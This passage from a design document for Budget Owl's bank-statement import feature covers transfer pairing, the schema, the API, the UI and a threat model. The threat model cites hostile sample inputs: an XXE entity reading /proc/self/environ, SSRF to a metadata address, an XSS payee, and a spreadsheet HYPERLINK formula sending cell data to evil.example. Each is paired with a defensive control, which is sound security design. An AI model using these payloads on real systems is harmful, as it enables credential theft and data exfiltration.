- The payee is cleared on both, because a transfer has no payee (ADR-0033).
- Both rows' versions move forward. The new pair's version is the sum of the two, as for every
  transfer.

Nothing else changes: account, amount, status, `external_id` and `import_batch_id` stay as they
were. Keeping `external_id` means a later overlapping statement still sees each row as an exact
duplicate. Keeping `import_batch_id` is harmless, because undoing an import removes only rows that
are not transfer legs (decision 5). Links from a bill occurrence, envelope entry, debt payment or
goal contribution to either row are not touched.

**Undo is a split.** `POST /api/transfers/{id}/split` turns a pair back into two ordinary rows:
`transfer_group_id` is cleared on both, versions move forward, and nothing else changes. It needs the
pair's `version` (`409 stale-version`), and a `VIEWER` is refused. The rows come back **with no
category and no payee**, because pairing cleared them and nothing stored the old values. They land
in "Needs a category". A split works on any transfer, including one made with *Move money*, because
nothing records how a pair was made. Like editing or deleting a transfer, it is allowed when an
account has since been archived.

**Decided: each leg keeps its own date and note.** Imported legs usually clear on different days,
and the bank's date is the true one, so pairing never rewrites it. That needs a change to
transfers, and this slice makes it:
- **Today:** a transfer has one date and one note. `TransferService` writes the same date and note
  to both legs, `GET /api/transfers/{id}` reports the outgoing leg's, and `PATCH` writes both
  fields to both legs even when the patch changes neither. So pairing rows dated 3 and 5 August
  would show 3 August, and the first edit would move the incoming row to 3 August.
- **Change 1:** the transfer response carries `fromDate`/`toDate` and `fromNote`/`toNote`.
- **Change 2:** `PATCH` writes only the fields it is sent, so editing the amount leaves both dates
  alone.
- **Unchanged:** *Move money* still sends one date and one note, written to both legs.
- **Docs:** `transfers.md` is updated in the same change.

ADR-0033 never required a shared date. Rejected: writing one date to both legs, which would make
the ledger disagree with the bank statement the row came from. (Decided 2026-11-25. The owner
accepted the doc's recommendations, and this is the secure, truthful default.)

## Data model

Migration `V<next>__file_import.sql`. The number is whatever is free when this is implemented:
V17 is the latest today, and other slices are in flight.

### `import_batches`: one row per committed import

| Column | Type | Notes |
|---|---|---|
| `id` | `uuid` | PK |
| `household_id` | `uuid` | `NOT NULL`, FK → `households ON DELETE CASCADE` |
| `account_id` | `uuid` | `NOT NULL`. **Composite** FK `(account_id, household_id)` → `accounts (id, household_id)` `ON DELETE CASCADE`, so a batch can never name another household's account. It cascades because an account can only be deleted once it is empty, and a batch is metadata |
| `imported_by` | `uuid` | nullable, FK → `users ON DELETE SET NULL`. Who did it (repudiation) |
| `format` | `text` | `CHECK (format IN ('CSV','OFX','QIF'))` |
| `imported_count`, `duplicate_count`, `excluded_count`, `unreadable_count`, `zero_count` | `integer` | `NOT NULL`, `CHECK (... >= 0)` |
| `preview_digest` | `text` | `NOT NULL`, `CHECK (preview_digest ~ '^[0-9a-f]{64}$')`. `UNIQUE (household_id, preview_digest)` makes commit idempotent |
| `created_at` | `timestamptz` | `NOT NULL DEFAULT now()` |

`UNIQUE (id, household_id)` exists as a composite FK target. **No file name** (decision 4),
**no file hash, no statement balance, no account number.**

### `transactions.import_batch_id`

A nullable `uuid` with composite FK `(import_batch_id, household_id)` →
`import_batches (id, household_id)` `ON DELETE SET NULL (import_batch_id)`, using the PostgreSQL 15+
column-list form that `V12` established for `category_id`. It has its own index, because
`SchemaMigrationIT.everyForeignKeyIsIndexed` requires one. It is provenance ("imported" rather than
"typed", the same principle as envelope entries' `MANUAL`/`SYNCED`) and it is the handle for undo
(decision 5). `external_id` stays as it is.

### `import_mappings`: one saved CSV mapping per account

| Column | Type | Notes |
|---|---|---|
| `id` | `uuid` | PK |
| `household_id` | `uuid` | `NOT NULL`, FK → `households ON DELETE CASCADE` |
| `account_id` | `uuid` | `NOT NULL`, `UNIQUE`, composite FK → `accounts (id, household_id)` `ON DELETE CASCADE` |
| `delimiter`, `charset`, `date_format`, `decimal_separator`, `grouping_separator` | `text` | each with a `CHECK` against the same allowlist the API uses |
| `header_row` | `smallint` | `CHECK (header_row BETWEEN 0 AND 20)`. Map it with `@JdbcTypeCode(SqlTypes.SMALLINT)` (see gotchas) |
| `invert_sign` | `boolean` | `NOT NULL DEFAULT false` |
| `columns` | `jsonb` | role → column index, plus the header labels it was made against. `CHECK (octet_length(columns::text) <= 4096)`. Validated by the application |
| `created_at`, `updated_at`, `version` | | as everywhere else |

A mapping holds **settings and the bank's column labels, never a cell value.**

No new database grants are needed: `V10`'s default privileges cover new tables (ADR-0030). Extend
`ApplicationRoleRestrictionsIT` to insert into all three, because it already lags for the
transactions tables ([transactions.md](transactions.md), Known gaps).

No staging table, and no table holding file content, by design (rules 1 and 11).

Pairing (rule 12) needs no schema change. It writes `transfer_group_id`, which V12 created and V15
constrained.

## API

All routes are authenticated and household-scoped from the caller's verified membership. Every
non-`GET` needs `OWNER` or `MEMBER` and, on the session transport, a CSRF token. **The role is
checked before the account is looked up and before the file is decoded**, so a `VIEWER` gets `403`
and not a `404`, and a refused caller costs no parsing (the ordering is from
[accounts.md](accounts.md)).

| Method | Path | Purpose | Auth |
|---|---|---|---|
| `POST` | `/api/imports/preview` | Parse and classify. **Writes nothing** | `OWNER` / `MEMBER` |
| `POST` | `/api/imports` | Re-parse, verify the digest, write the batch and its rows atomically. `201` + `Location: /api/imports/{id}`; `200` with the existing batch on a retried commit | `OWNER` / `MEMBER` |
| `GET` | `/api/imports?accountId=` | Import history, newest first, paginated | any member |
| `GET` | `/api/imports/{id}` | One batch | any member |
| `DELETE` | `/api/imports/{id}` | Undo (decision 5). Removes the batch's rows that are not transfer legs, in one transaction. `204` | `OWNER` / `MEMBER` |
| `GET` | `/api/accounts/{id}/import-mapping` | The saved CSV mapping, `404` if none | any member |
| `PUT` | `/api/accounts/{id}/import-mapping` | Save or replace it. Requires `version` when replacing | `OWNER` / `MEMBER` |
| `DELETE` | `/api/accounts/{id}/import-mapping` | Forget it. `204` | `OWNER` / `MEMBER` |
| `POST` | `/api/transactions/{id}/pair` | Rule 12. `{"withTransactionId": "…", "version": 3, "withVersion": 1}`. Pairs this row with the other into a transfer. `200` with the transfer, in the `GET /api/transfers/{id}` shape | `OWNER` / `MEMBER` |
| `POST` | `/api/transfers/{id}/split` | Rule 12. `{"version": 6}`, the pair's version. Turns the pair back into two ordinary rows. `200` with both rows, in the ledger row shape | `OWNER` / `MEMBER` |

The two pairing routes are a non-CRUD action on a resource, so each is a sub-resource, as
[api-style.md](../guides/api-style.md) asks. They take no file and no amount: every figure stays
where it was.

### Request: `PreviewImportRequest` (commit adds three fields)

```json
{
  "accountId": "…uuid…",
  "format": "CSV",
  "file": "<base64, decoded size ≤ 5 MiB>",
  "options": {
    "charset": "windows-1252",
    "delimiter": ",",
    "headerRow": 1,
    "dateFormat": "dd/MM/uuuu",
    "decimalSeparator": ".",
    "groupingSeparator": ",",
    "invertSign": false,
    "columns": { "0": "DATE", "1": "PAYEE", "3": "AMOUNT" },
    "saveMapping": true
  }
}
```

`CommitImportRequest` adds `"previewDigest": "<64 hex>"`, `"suspectedDuplicates": "EXCLUDE" |
"INCLUDE"`, and `"overrides": [{"row": 17, "include": true}]` (at most the row cap, and only for
suspected rows; an override naming an exact-duplicate or unreadable row is
`400 validation-failed`). For OFX, only `charset` (when the preview asked for it) and `invertSign`
apply. QIF also takes `dateFormat`, because QIF dates are as ambiguous as CSV's. The rest of
`options` is CSV only, and sending it for another format is `400 validation-failed`.
**No `fileName` field** (decision 4). An unknown
property is refused, as everywhere (`FAIL_ON_UNKNOWN_PROPERTIES`).

Why JSON and base64 rather than a multipart upload or a raw body:

| Option | Why not |
|---|---|
| `multipart/form-data` | Spools the file to the temp directory by default (rule 11). It adds a second request parser with its own limits (part count, header size) to configure and keep configured. It is the conventional choice, which is why it is listed. Revisit only if the 5 MiB cap is ever raised far enough that base64's overhead matters |
| Raw `application/octet-stream` body, options in query parameters | The CSV options do not fit a query string, and a second request for options brings back server-side state. The body would also have no DTO, so non-negotiable #5 (Bean Validation on every request DTO) would need an exception |
| **JSON with a base64 `file` field** (chosen) | One input path that is already hardened: Jackson's strictness, `ApiExceptionHandler`, `@Valid` on `options`. Nothing touches disk. Costs about 33% more bytes on the wire, and transient heap of roughly 3–4× the file size while decoding, which is bounded by the cap |

Two things this choice makes mandatory. (1) **`PreviewImportRequest.toString` prints the file's
length, never its content**, because Spring MVC logs the deserialised body at `DEBUG` (see
gotchas). `SecretsAreNotPrintableTest` only covers components named like secrets, so this needs its
own assertion. (2) The base64 field gets **no `@Size` or `@Pattern`.** A constraint violation puts
the rejected value into `ExceptionHandlerExceptionResolver`'s log line, and a regex over 7 MB is its
own cost. The size is enforced on the body (rule 3), and decoding uses the strict
`Base64.getDecoder()`. Jackson's `StreamReadConstraints.maxStringLength` must be checked against the
chosen cap, because if it is lower, every large import fails as `malformed-request`.

### Response: preview

```json
{
  "previewDigest": "…64 hex…",
  "account": { "id": "…", "name": "Chase", "lastFour": "4412", "currency": "USD" },
  "format": "OFX",
  "charset": "windows-1252",
  "charsetSource": "DECLARED",
  "statement": { "from": "2026-08-01", "to": "2026-08-31",
                 "bankClosingBalance": "1234.5600", "accountHint": "MATCHES" },
  "counts": { "read": 415, "new": 409, "duplicate": 3, "suspected": 2, "unreadable": 1, "zero": 0 },
  "totals": { "moneyIn": "3200.0000", "moneyOut": "-2871.4400", "currency": "USD" },
  "balanceAfter": "1234.5600",
  "attention": [
    { "row": 17, "kind": "SUSPECTED_DUPLICATE", "date": "2026-08-03", "amount": "-3.5000",
      "payeeName": "BLUE BOTTLE", "resembles": { "transactionId": "…", "date": "2026-08-02" } },
    { "row": 88, "kind": "UNREADABLE", "code": "row-date-unreadable", "column": 0, "text": "31/02/2026" }
  ],
  "attentionTruncated": false,
  "sample": [ "the first 20 new rows, in the ledger row shape" ],
  "csv": { "columnCount": 4, "headerLabels": ["Date", "Description", "Ref", "Amount"],
           "firstRecords": [["…"]], "suggested": { "…": "…" },
           "mappingMatchesSaved": true }
}
```

- `accountHint` is `MATCHES`, `DIFFERS` or `UNKNOWN`. It is computed in memory from the file's
  `ACCTID` and the account's `lastFour`. **No digits from the file are returned.**
- `bankClosingBalance` is the file's `LEDGERBAL`, returned to the person who uploaded it and never
  stored. `null` for CSV and QIF.
- `attention` holds every unreadable row, every suspected duplicate and every exact duplicate, up to
  **500**. Beyond that `attentionTruncated` is `true`. That many problems almost always means a
  wrong mapping, and the screen says so.
- **This is a bounded exception to "every collection is paginated"**
  ([api-style.md](../guides/api-style.md#collections)). The preview is the result of an action on
  one upload, not a stored collection. It is bounded by the row cap and the attention cap, and
  paging it would need the server-side state rule 1 avoids.
- `text` on an unreadable row is the offending cell cut to 64 characters, so the person can find it
  in their file. It is their own data, returned to them over TLS with `Cache-Control: no-store`. It
  is **never logged**.

### Error codes (new ones in bold)

| Code | Status | When |
|---|---|---|
| **`import-file-too-large`** | 413 | Over the size cap at any of the three layers |
| **`import-file-empty`** | 400 | Nothing to read |
| **`import-file-malformed`** | 400 | Structural refusal. `params.reason` comes from a fixed list: `dtd`, `binary`, `header`, `line-too-long`, `too-many-columns`, `too-deep`, `too-many-elements`, `element-too-long`, `encrypted`, `compressed`, `not-a-statement`, `unclosed-quote`. **Never free text from a parser exception** |
| **`import-format-mismatch`** | 400 | Declared format is not what the bytes are |
| **`import-encoding-unsupported`** | 422 | Declared or chosen charset not in the allowlist |
| **`import-multiple-accounts`** | 422 | More than one statement in the file |
| **`import-currency-mismatch`** | 422 | `CURDEF` is not the account's currency |
| **`import-too-many-rows`** | 422 | Line or record cap |
| **`import-file-too-complex`** | 422 | Parse deadline |
| **`import-preview-stale`** | 409 | Commit's digest differs from the preview's, or a concurrent commit won the unique index |
| `account-archived` | 409 | As in transactions. Also refuses pairing a row in an archived account (rule 12) |
| **`transfer-pair-mismatch`** | 422 | Pairing two rows that cannot be one transfer (rule 12). `params.reason` is `same-account`, `same-sign` or `amounts-differ` |
| `transfer-leg-not-separate` | 409 | Pairing a row that is already a transfer leg (rule 12). The existing code |
| `validation-failed` | 400 | Bad `options`, bad overrides, an ambiguous date format still unchosen, a charset still unchosen |
| `malformed-request` | 400 | Unbindable body, unknown property, invalid base64 |
| `read-only-role` · `not-a-member` · `csrf-token-required` · `not-found` · `rate-limited` · `stale-version` | 403 · 403 · 403 · 404 · 429 · 409 | As everywhere else |

`413` is not in api-style's list of status codes. It is added here because it is the status that
nginx and every other proxy use for the same condition, so the client handles one meaning.

Row-level codes appear only inside `attention`: `row-date-unreadable`, `row-date-ambiguous`,
`row-date-out-of-range`, `row-amount-unreadable`, `row-amount-too-precise`, `row-amount-too-large`,
`row-currency-mismatch`, `row-missing-field`, `row-columns-short`, `row-entity-unknown`.

## UI

**`design/README.md` and the canvas contain no import flow.** There is no upload screen, no
column-mapping screen and no preview screen. The canvas does mention import in eight places, and
those set expectations this doc has to meet or deliberately depart from:

| Where in the canvas | What it shows |
|---|---|
| Admin · Connections · desktop | A **File import** card: "Always available · Drop statements exported from your bank. No provider, no keys, no approval", a dashed drop zone "Drop OFX, QFX, QIF or CSV · **Up to 25 MB** · **duplicates matched on date, amount and payee** · Choose files", **"Saved column mappings"** ("Chase checking · CSV · 4 columns", "Sun Federal CU · QFX · native"), and **"Last import chase-aug.ofx · 118 rows, 3 duplicates skipped · yesterday 08:03"** |
| Admin · Overview · desktop | An activity feed entry "Statement imported · **chase-aug.ofx** · Yesterday, 08:03" |
| Admin · Settings · desktop | A toggle "**Auto-categorize on import**" among the job-queue settings |
| Admin · Storage | Raw provider payloads kept "for debugging a bad import" (slice 16, see rule 11) |
| Admin · Updates | A fictional 1.5.0 changelog: "File import accepts CAMT.053 and multi-account OFX" |
| Admin · First-run acknowledgement | "You can skip this and use **file import only**. Statements dropped in as OFX or CSV need no provider, no credentials and no acknowledgement" |
| An onboarding connect screen | "Rather not connect? You can add accounts manually and **import a CSV any time**" |
| Bills & Income header | An **"Import CSV"** button beside "Add manually". It opens the same statement import (decision 2b) |

So the flow below is **built from existing patterns and tokens**, as accounts did
([accounts.md](accounts.md#ui)). When the canvas gains an import artboard, this section is what gets
reconciled.

**Where it lives (decision 2):** a routed page **`/import`** in the household app,
not the admin console, because importing is a household write by an `OWNER` or `MEMBER` and the
admin console is for the instance administrator (ADR-0029). It is reached from:

- an **Import a statement** button on the ledger, beside *Record a transaction* and *Move money*;
- an **Import** action on each account row, which preselects that account;
- the admin Connections card, which links to `/import` and shows only counts;
- the **Import CSV** button on Bills & Income, which opens the same page (decision 2b).

It is a page, not a modal. A three-step flow with a table does not fit a `<dialog>` at 390 px, and
the transfer sheet and account dialog are single-step.

**Step 1: what, and where.** An account picker that offers only unarchived accounts, as the
transfer sheet does, showing `name •1234`. A **native `<input type="file" accept=".csv,.ofx,.qfx,.qif">`**
with a visible label. The dashed drop zone from the canvas card is an enhancement around that
input, never the only way in, for the same reason the payee field is a native `<datalist>`. A
format select is preselected from the extension and can be changed. The client checks the size
first as a courtesy; the server's check is the control. The file is read with `FileReader` into
memory and is **never** put into `localStorage`, `sessionStorage`, IndexedDB or the service-worker
cache.

**Step 2: mapping (CSV only, or when the preview asks for a charset or date format).** The first
five records in a table, with a role `<select>` above each column; on 390 px, a list of "Column 1 ·
'Date' → [Date ▾]" rows. Delimiter, header row, date format, decimal and grouping separator,
"money out appears as: negative / positive / a separate column", and a charset select showing
decoded samples next to the question "Does this text look right?". The saved mapping is
preselected, and a changed header is announced. An **Update preview** button re-runs the preview,
rather than re-running it on every change, which would also burn through the rate limit. A status
line in an `aria-live` region says when the preview is being recomputed.

**Step 3: preview.** A summary card: "409 new · 3 already imported · 2 look like ones you typed ·
1 couldn't be read", money in and money out (each through `I18nService.formatMoney` from the API's
string; **no amount is parsed in the client**, ADR-0006), the date range, and for OFX "Your bank
says the balance is X; after this import Budget Owl will say Y", with the difference called out if
there is one. If `accountHint` is `DIFFERS`, a warning that names the selected account's `•1234`
and says the file looks like it belongs to a different one. Then the attention list, where each
suspected row has a checkbox whose label names the row ("Include 3 Aug, Blue Bottle, −$3.50") and
shows the transaction it resembles, plus "include all" and "exclude all". Unreadable rows are listed
with their line number and reason. Finally the sample, in the ledger's own row layout, with amounts
in the fixed-width column.

**Confirm.** The primary button carries the count and the account: **"Import 409 transactions into
Chase •4412"**. The preview is the confirmation, so there is no second dialog. A
`409 import-preview-stale` re-runs the preview and says what changed ("3 of these were imported by
someone else a moment ago") without committing. The success state links to the ledger filtered to
that account, and offers undo (decision 5). The undo confirmation names the count and the account,
and says that rows since attached to a bill, debt payment or envelope entry lose that link.

**Pairing a transfer (rule 12).** On a ledger row that is not a transfer leg, an `OWNER` or
`MEMBER` gets **This is a transfer…**. It opens a sheet where the person picks the other row, using
the ledger's existing account and date filters. The list is in ledger order, and nothing is ranked
or preselected. Before confirming, the sheet says that both rows lose their category and payee and
stop counting as income or spending. A refusal is rendered from its code and reason. Every
transfer row gets a **Split into two rows** action beside Edit and Delete, whose confirmation says
the rows come back with no category. A `VIEWER` sees neither action.

**Throughout:** every string from `en.json`, and every error rendered from its problem `code`
(ADR-0023). Every date is formatted from its ISO string by the i18n formatter. Payee text is shown
through interpolation only, inside an element with `dir="auto"`, so a right-to-left or hostile payee
cannot reorder the text around it. Colours, spacing and radii come from the existing tokens, with no
new ones. Type sizes have the token-sheet gap `design/README.md` already records. The dashed border
uses the existing border colour token, and if the sheet has no dashed style, that is a design-system
question, not a hex. Both viewports, light and dark. Shared components reused: `error-alert` and
`field-error` throughout, and `confirm-dialog` only for undo. `currency-field` is not needed,
because nothing on these screens takes an amount as input.

**A `VIEWER`** sees no import entry point. Navigating to `/import` directly shows a plain "Viewers
can't import statements" state, not a form that will be refused. The server's `403` is the control.

**Mobile (slice 15):** a share-sheet target for `.ofx`, `.qfx`, `.qif` and `.csv`, calling the same
API. Any copy the OS hands the app goes in the app's cache directory and is deleted when the
request completes.

**User guide:** required (non-negotiable #11). An "Import a bank statement" page, captured from the
running UI against the fixtures, covering how to export from a bank, what duplicates and suspected
duplicates mean, and what a `413` from your own reverse proxy means.

## Security considerations

This section is the threat model. It touches [security-model.md](../architecture/security-model.md)
on authorization axes 1 and 2, CSRF, input validation, logging and errors, database privileges and
response headers. It does **not** touch authentication, sessions or tokens, and nothing here changes
them.

### Assets

- **The household's ledger**, which import writes into: its integrity (no lost rows, no doubled
  rows, no wrong signs) and its availability.
- **The uploaded statement while it is in memory**: full account number, sort code or routing
  number, holder name and address, balances, a year of payees, and possibly an online-banking
  username (QFX `INTU.USERID`). It is more sensitive than anything stored about an account.
- **The API process and its environment.** The container's environment holds `DB_PASSWORD` and
  `DB_APP_PASSWORD` (readable at `/proc/self/environ`), and its network reaches the database, the
  optional assistant sidecar (ADR-0027) and whatever else is on the self-hoster's LAN.
- **The instance's availability** on hardware that may be small.
- **The log stream**, which leaves the box in bug reports.

### Actors

1. **The author of a hostile file.** This is the actor specific to this feature, and the most
   likely one: someone who gets a member to import a file they made, a "statement" sent by email or
   chat, or a compromised export. They do not need an account on the instance, only a member willing
   to click Import.
2. A **`VIEWER`** trying to write.
3. A **member attacking their own household's data** in unintended ways: forged digests, overrides,
   ids from elsewhere.
4. A **hostile page in the member's browser** (CSRF).
5. An **unauthenticated stranger** on an internet-facing instance.
6. **Someone who stole a session or token**: they have the member's powers and no more. Import adds
   nothing for them beyond what `POST /api/transactions` already gives.

### Entry points

`POST /api/imports/preview`, `POST /api/imports`, `GET /api/imports`, `GET /api/imports/{id}`,
`DELETE /api/imports/{id}`, `GET|PUT|DELETE /api/accounts/{id}/import-mapping`,
`POST /api/transactions/{id}/pair` and `POST /api/transfers/{id}/split`. Inside
the first two, every byte of `file` and every field of `options`, `overrides`, `previewDigest` and
`suspectedDuplicates`. The `Content-Length` and `Content-Encoding` headers. The OFX header block, the
XML prolog, and every element and attribute. Every CSV cell and every QIF line. There is no
background job, because parsing happens inside the request.

### Attacks considered, and their controls

**Information disclosure and SSRF through XML**

- *An attacker emails a member a "statement.ofx" in OFX 2.x form whose DTD declares
  `<!ENTITY x SYSTEM "file:///proc/self/environ">` and whose `NAME` is `&x;`. The member previews it,
  and the payee column shows the API container's environment, including `DB_PASSWORD`.*
  **Control:** a `DTD` event refuses the file, external entities and DTD access are off on the
  `XMLInputFactory` instance, undeclared entity references are errors (rule 5). Enforced in the OFX
  2.x reader. **Test:** `OfxXmlHostileInputTest` writes a sentinel to a temp file and references it,
  and asserts `400 import-file-malformed` with reason `dtd`, and that the sentinel appears in neither
  the response nor the captured log.
- *The same file uses `SYSTEM "http://169.254.169.254/…"`, `http://assistant:…/` or a LAN router's
  admin page, so the instance makes a request on the attacker's behalf (blind SSRF, with the result
  sent out through a second entity).* **Control:** as above. Nothing in the import path opens a URL.
  **Test:** a local HTTP server started by the test records hits, and the assertion is **zero**
  hits, not just a `400`.
- *A billion-laughs or quadratic-blowup entity set expands to gigabytes and takes the instance
  down.* **Control:** no DTD means no entity declarations. The element, depth and leaf caps and the
  parse deadline bound everything else. **Test:** the classic payload is refused within 1 s, with
  heap growth below a stated bound.
- *An OFX 1.x file carries `<!DOCTYPE …>` or `<!ENTITY …>` in its SGML body, hoping the reader is an
  SGML or XML parser underneath.* **Control:** the purpose-built tokenizer refuses `<!` in the body
  and looks up no entity names. **Test:** both refused with reason `dtd`.

**Denial of service through size and shape**

- *A 2 GB upload, or a chunked one with no `Content-Length`, exhausts memory before anything checks
  it.* **Control:** nginx `client_max_body_size` on `location /api/imports`, a counting filter that
  refuses past the cap whether or not `Content-Length` is present, and a re-check after decoding.
  **Test:** an integration test sends cap+1 bytes both with and without `Content-Length` and expects
  `413` and no parse. An `nginx -t` plus request test in CI checks the location block, because the
  default 1 MiB would silently break legitimate imports.
- *A gzip-encoded request body, or an OFX with `COMPRESSION` other than `NONE`, decompresses to many
  times its size.* **Control:** a `Content-Encoding` other than `identity` gets `415`, the OFX header
  is checked, and no archive format is accepted. **Test:** each one refused.
- *A CSV with one unclosed quote on line 2 makes the rest of the file one field. Or one 4 MB line.
  Or 4 million empty lines. Or 10,000 columns.* **Control:** the pre-scan counts lines and line
  length before any CSV parser runs, plus the record and column caps. **Test:** each one refused with
  its specific reason, in under 1 s.
- *An amount cell of `1E+10000000` takes 4.4 s of CPU in `setScale`, and a file of 10,000 such cells
  takes most of a day.* **Control:** the strict lexer (rule 7) refuses exponent notation before
  `BigDecimal` exists, and text over 64 characters is refused before lexing. **Test:**
  `ImportAmountLexerTest` covers `1E5`, `1e+10000000`, `NaN`, `Infinity`, `0x1p3`, `١٢٣`, `１２３`
  (full-width), `12abc`, `1.2.3`, `--5`, `(5)-`, 16 integer digits and 5 decimal places, each refused
  with its code. A jqwik property: for every `BigDecimal` within `NUMERIC(19,4)`, formatting it in
  each allowed style and lexing it back is exact, and **nothing in `ImportAmountLexer` references
  `double`, `float`, `NumberFormat` or `DecimalFormat`** (an ArchUnit rule on the import package).
- *A member scripts previews in a loop to pin the CPU.* **Control:** a per-user rate limit, one
  concurrent parse per user, two per instance, and the parse deadline. **Test:** the 31st request in
  the window and a concurrent second request both get `429` with `Retry-After`.
- *A file of 10,000 rows with 10,000 distinct payees bloats the payee table.* **Control:** bounded
  by the row cap. Accepted (see below).

**Integrity of the ledger**

- *A member imports the same file twice, or two members import it at the same moment, and the
  ledger doubles.* **Control:** tier-1 `external_id`s under `ux_transactions_household_external_id`.
  Commit re-classifies, and a race that gets past re-classification loses on the unique index,
  rolls back completely, and gets `409 import-preview-stale`. **Test:** commit twice and expect the
  second to return the first batch with `200` (idempotent). Then two concurrent commits of one
  preview: exactly one batch, and the other gets `409` or the idempotent `200`, never a partial
  write.
- *Two accounts at different banks both have `FITID 1001`. Importing the second account's file
  silently drops its real transaction as a "duplicate" of the first's.* **Control:** the account id
  is inside the hashed `external_id` (rule 9). **Test:** two accounts, the same `FITID`, both import.
- *Two genuinely identical purchases are collapsed into one.* **Control:** the occurrence ordinal.
  **Test:** two identical rows import as two. A re-import adds zero. An overlapping file adds only
  the genuinely new third row.
- *A file with inverted signs, or one meant for a different account, is committed by a member who
  did not look closely.* **Control:** the preview shows money in and money out separately, the bank's
  closing balance against the resulting balance, and `accountHint`. The button names the account.
  **Test:** a UI spec checks that the balance difference and the `DIFFERS` warning render. An
  integration test checks that `accountHint` is computed and that no `ACCTID` digit appears in the
  response.
- *A hostile date such as `2026-02-30` is accepted as the 28th, or a two-digit year lands a
  transaction in 1926.* **Control:** `STRICT` with `uuuu`, ASCII digits, the range bound, and the
  resolved date shown in the preview. **Test:** `ImportDateParserTest` covers 30 February, 29
  February in a leap and a non-leap year, `0000-01-01`, `+10000-01-01`, Arabic-Indic digits, the
  serial `45678`, an all-days-≤12 file returning `dateFormat: null`, and `DTPOSTED` at
  `20260731233000[-8:PST]` staying on **31 July**.
- *A member's client forges `previewDigest`, `overrides` or `external_id`s to write rows that were
  not in the preview, or to suppress future imports.* **Control:** nothing parsed comes from the
  client. Commit re-parses, the server computes every `external_id`, and overrides may only name
  suspected rows. **Ruled out as an escalation:** the most a forged digest achieves is writing what
  the server parsed from the uploaded file into an account the caller may already write to, which is
  less than `POST /api/transactions` allows. **Test:** an override naming an exact duplicate or an
  unreadable row gets `400`. A mismatched digest gets `409` and writes nothing.
- *The account is archived, or its currency changes, between preview and commit.* **Control:**
  commit checks again (`409 account-archived`), and the account currency is inside the digest.
  **Test:** both.

**Authorization (axes 1 and 2)**

- *A `VIEWER` previews or commits an import, or saves a mapping.* **Control:**
  `MembershipService.requireWriteAccess` first in every non-`GET` service method, before the account
  lookup and before decoding. Preview is refused even though it writes nothing: it exists only to
  serve a write, and it costs CPU. That is the same reasoning the debt payment preview uses.
  **Test:** `403 read-only-role` on every non-`GET` route, including with a non-existent account id
  (`403`, not `404`), under the session and the bearer transport.
- *A member sends the `accountId` of an account that is not their household's (a managed deployment,
  or a guessed id), to write into it or to learn whether it exists.* **Control:**
  `accounts.findByIdAndHouseholdId(accountId, membership.householdId())`, so another household's
  account is `404`. The composite FKs on `transactions`, `import_batches` and `import_mappings` make
  it structurally impossible even if the service is wrong. **Test:** a second household seeded the
  way `AccountHouseholdScopingIT` does it; `404` on every route, and no row written.
- *An instance administrator who is not a household member uses import to write financial data.*
  **Control:** no membership means `403 not-a-member`. Import is not an admin route. **Test:** as
  stated.
- *A hostile page submits the upload using the member's cookie.* **Control:** CSRF tokens on every
  non-`GET` route over the session transport. **Test:** `403 csrf-token-required` on each route.

**Pairing and splitting (rule 12)**

- *A member sends `withTransactionId` from another household, to pull a foreign row into their
  transfer, or to learn whether the id exists.* **Control:** both rows are resolved through
  `findByIdAndHouseholdId` with the caller's household, so a foreign id is `404`, the same answer
  as a missing one. **Test:** the second-household sweep covers both routes, with the foreign row
  unchanged afterwards.
- *A `VIEWER` pairs or splits rows, which changes what reporting counts as income and spending.*
  **Control:** `requireWriteAccess` first, before either row is looked up. **Test:** `403` on both
  routes, also with unknown ids, under both transports.
- *Two members pair the same row with different partners at the same moment, and the row ends up
  in two transfers, or a group gets three legs.* **Control:** each row's version is checked, and
  `@Version` makes the slower write fail at flush (`409 stale-version`). V15's deferred trigger
  refuses any group that is not exactly two rows in two accounts with opposite signs. **Test:** two
  concurrent pairings sharing a row produce one transfer and one `409`, never a partial write.
- *A member pairs two unrelated rows to hide spending from reporting.* **Ruled out as an
  escalation:** a member can already edit or delete any row. The amount rules make an unrelated
  pair hard to build by accident, and the pair is visible in both accounts' ledgers.
- *Pairing or splitting writes amounts or payee names to the log.* **Control:** audit lines carry
  the two transaction ids, the group id and the acting user only, as transfers' do. **Test:**
  `ImportDisclosureIT` includes a pairing and a split.

**Injection into what we display or export**

- *A payee of `<img src=x onerror=…>` executes in the ledger.* **Control:** Angular interpolation
  and Flutter `Text`, with no `innerHTML` and no `bypassSecurityTrust*`. **Test:** a fixture row with
  that payee renders as literal text in `tools/ui` specs.
- *A payee wrapped in U+202E (right-to-left override) displays as a different, trusted-looking name,
  or reverses the amount beside it.* **Control:** bidi controls are stripped at normalisation, and
  each payee renders in its own `dir="auto"` element. **Test:** the normaliser unit test, and a UI
  fixture row.
- *A payee of `=HYPERLINK("https://evil.example/?"&A1,"refund")` is harmless here and becomes live
  the day Budget Owl exports a CSV that the household opens in a spreadsheet.* **There is no export
  today:** no CSV writer exists in `backend/src/main` or `frontend/src` as of 2026-11-25. **Control,
  recorded for whoever builds the first export:** every exported **text** cell that begins with `=`
  `+` `-` `@`, tab, CR or their full-width forms is prefixed with `'`, and every field is quoted.
  Amount columns are written as plain decimals in their own column and are not prefixed, because
  their leading `-` is meaningful. **Import stores the text as it is**, for two reasons. A payee typed
  into the transaction form can carry the same payload, so stripping at import would not close the
  hole. And mutating text at import corrupts legitimate values. **Test:** belongs to the export
  feature, and a test there must use an imported payload.
- *A payee containing CR/LF forges log lines.* **Control:** no imported value is ever logged, and
  control characters are stripped at normalisation. **Test:** covered by the disclosure test below.

**What reaches the logs and error responses**

- *An operator turns on `DEBUG` to chase an import problem, and the log collects whole statements.*
  Paths that would leak: Spring MVC's `DEBUG` line for the request body (`PreviewImportRequest`
  with its base64), and for the response (the preview's rows); Hibernate's `EntityPrinter` on
  flushing 10,000 transactions; `ExceptionHandlerExceptionResolver` echoing a rejected value; parser
  exception messages (StAX and CSV readers put the offending text and its position in `getMessage()`);
  and `DataIntegrityViolationException`'s `DETAIL` line. **Controls:** redacted `toString` on every
  import request, response and internal record, printing counts and lengths only. The existing pins
  of `org.hibernate.orm.core` and the resolver to `INFO`. Parser exceptions caught at the import
  boundary and rethrown carrying only a fixed reason code and a record number, in the
  `RedactedThrowable` shape. `DataIntegrityViolationException` never logged with its message.
  **Test:** `ImportDisclosureIT` runs preview, commit, re-commit, a stale commit, every
  `import-file-malformed` reason, an unreadable row, a `VIEWER` refusal and a `404`, with the root
  logger at `INFO` and again at `DEBUG`. It asserts that sentinels planted in the payee, memo,
  `ACCTID`, `BANKID`, `INTU.USERID`, the amount and the file name are absent from all captured
